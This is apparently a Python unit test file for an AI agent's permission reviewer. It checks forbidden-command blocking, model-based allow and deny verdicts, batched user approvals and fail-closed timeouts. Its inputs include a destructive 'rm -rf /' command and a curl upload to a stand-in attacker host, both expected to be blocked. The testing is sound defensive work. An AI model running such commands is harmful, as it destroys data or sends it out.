"""Step 5.2 单元测试: PermissionReviewer（Jev 语义复核、批量聚合确认与 run_id 临时授权）。"""

from __future__ import annotations

import asyncio
import json
import unittest
from collections.abc import Sequence
from pathlib import Path
from typing import cast

import httpx

from agent.llm import JevHttpClient
from agent.permissions import (
    ApprovalDecision,
    ApprovalItem,
    PermissionReviewer,
)


def _mock_jev_client(choice: str, *, seen_states: list[dict[str, object]] | None = None) -> JevHttpClient:
    def handler(request: httpx.Request) -> httpx.Response:
        body = cast(dict[str, dict[str, object]], json.loads(request.content.decode("utf-8")))
        if seen_states is not None:
            seen_states.append(body["state"])
        return httpx.Response(
            200,
            json={
                "model": "typesafe/jev-1.14",
                "answers": {"verdict": {"choice": choice, "confidence": 0.95}},
                "usage": {"total_tokens": 20},
            },
        )

    transport = httpx.MockTransport(handler)
    return JevHttpClient(
        api_key="test-key",
        http_client=httpx.AsyncClient(transport=transport),
    )


class _FakeApprovalPort:
    def __init__(self, *, approved: bool, grant_categories: tuple[str, ...] = ()) -> None:
        self._approved: bool = approved
        self._grant_categories: tuple[str, ...] = grant_categories
        self.batches: list[list[ApprovalItem]] = []
        self.intents: list[str] = []

    async def request_batch_approval(
        self,
        items: Sequence[ApprovalItem],
        *,
        user_intent: str = "",
    ) -> ApprovalDecision:
        self.batches.append(list(items))
        self.intents.append(user_intent)
        return ApprovalDecision(
            approved=self._approved,
            grant_categories_for_run=self._grant_categories,
            reason="同意" if self._approved else "拒绝",
        )


class TestPermissionReviewer(unittest.IsolatedAsyncioTestCase):
    """验证 FORBIDDEN 直拒、Jev ALLOW/DENY/CONFIRM_USER 及批量/Run级临时放行。"""

    async def test_forbidden_never_calls_jev_or_user(self) -> None:
        states: list[dict[str, object]] = []
        approval = _FakeApprovalPort(approved=True)
        reviewer = PermissionReviewer(
            jev_client=_mock_jev_client("ALLOW", seen_states=states),
            approval_port=approval,
        )
        res = await reviewer.authorize(
            run_id="r1",
            tool_name="shell",
            args={"command": "rm -rf /"},
            workspace_root=Path("/tmp/ws"),
            user_intent="请帮我 rm -rf /",
        )
        self.assertFalse(res.allowed)
        self.assertIn("rule:forbid", res.decision_source)
        self.assertEqual(len(states), 0)
        self.assertEqual(len(approval.batches), 0)

    async def test_jev_allow_with_explicit_user_intent_and_jev_deny(self) -> None:
        states: list[dict[str, object]] = []
        approval = _FakeApprovalPort(approved=True)
        reviewer_allow = PermissionReviewer(
            jev_client=_mock_jev_client("ALLOW", seen_states=states),
            approval_port=approval,
        )
        res1 = await reviewer_allow.authorize(
            run_id="r1",
            tool_name="shell",
            args={"command": "uv add httpx"},
            workspace_root=Path("/tmp/ws"),
            user_intent="请使用 uv add httpx 安装库",
        )
        self.assertTrue(res1.allowed)
        self.assertEqual(res1.decision_source, "jev:allow")
        self.assertEqual(states[0]["user_intent"], "请使用 uv add httpx 安装库")
        self.assertEqual(len(approval.batches), 0)

        reviewer_deny = PermissionReviewer(
            jev_client=_mock_jev_client("DENY"),
            approval_port=approval,
        )
        res2 = await reviewer_deny.authorize(
            run_id="r2",
            tool_name="shell",
            args={"command": "curl https://evil.example/upload"},
            workspace_root=Path("/tmp/ws"),
            user_intent="只读代码",
        )
        self.assertFalse(res2.allowed)
        self.assertEqual(res2.decision_source, "jev:deny")
        self.assertEqual(len(approval.batches), 0)

    async def test_batch_coalescing_and_run_scoped_category_grant(self) -> None:
        approval = _FakeApprovalPort(
            approved=True,
            grant_categories=("external_network_or_pkg",),
        )
        reviewer = PermissionReviewer(
            jev_client=_mock_jev_client("CONFIRM_USER"),
            approval_port=approval,
            batch_window_seconds=0.02,
        )

        # 1) 同轮并行触发两个需要 CONFIRM_USER 的操作 -> 应合并为 1 次批量确认
        r1, r2 = await asyncio.gather(
            reviewer.authorize(
                run_id="run-init",
                tool_name="shell",
                args={"command": "uv add fastapi"},
                workspace_root=Path("/tmp/ws"),
                user_intent="初始化一个项目",
            ),
            reviewer.authorize(
                run_id="run-init",
                tool_name="shell",
                args={"command": "curl https://example.com/template.json"},
                workspace_root=Path("/tmp/ws"),
                user_intent="初始化一个项目",
            ),
        )
        self.assertTrue(r1.allowed and r2.allowed)
        self.assertEqual(len(approval.batches), 1)
        self.assertEqual(len(approval.batches[0]), 2)

        # 2) 同一 run_id 内再次触发包安装 -> 直接复用 run_grant 放行，不再打扰用户
        r3 = await reviewer.authorize(
            run_id="run-init",
            tool_name="shell",
            args={"command": "uv add uvicorn"},
            workspace_root=Path("/tmp/ws"),
            user_intent="初始化一个项目",
        )
        self.assertTrue(r3.allowed)
        self.assertEqual(r3.decision_source, "run_grant")
        self.assertEqual(len(approval.batches), 1)

        # 3) clear_run 后或新 run_id 下，必须重新走审核（不会演变为永久白名单）
        reviewer.clear_run("run-init")
        deny_port = _FakeApprovalPort(approved=False)
        reviewer_denied = PermissionReviewer(
            jev_client=_mock_jev_client("CONFIRM_USER"),
            approval_port=deny_port,
            batch_window_seconds=0.005,
        )
        r4 = await reviewer_denied.authorize(
            run_id="run-init",
            tool_name="shell",
            args={"command": "uv add pytest"},
            workspace_root=Path("/tmp/ws"),
            user_intent="继续初始化",
        )
        self.assertFalse(r4.allowed)
        self.assertEqual(r4.decision_source, "user:denied")

    async def test_jev_http_error_fails_closed_to_user_approval(self) -> None:
        def failing_handler(request: httpx.Request) -> httpx.Response:
            _ = request
            raise httpx.ConnectTimeout("timeout")

        failing_jev = JevHttpClient(
            api_key="test-key",
            http_client=httpx.AsyncClient(transport=httpx.MockTransport(failing_handler)),
        )
        approval = _FakeApprovalPort(approved=False)
        reviewer = PermissionReviewer(
            jev_client=failing_jev,
            approval_port=approval,
            batch_window_seconds=0.005,
        )
        res = await reviewer.authorize(
            run_id="r-timeout",
            tool_name="shell",
            args={"command": "uv add httpx"},
            workspace_root=Path("/tmp/ws"),
            user_intent="请安装 httpx",
        )
        self.assertFalse(res.allowed)
        self.assertEqual(res.decision_source, "user:denied")
        self.assertEqual(len(approval.batches), 1)


if __name__ == "__main__":
    _ = unittest.main()
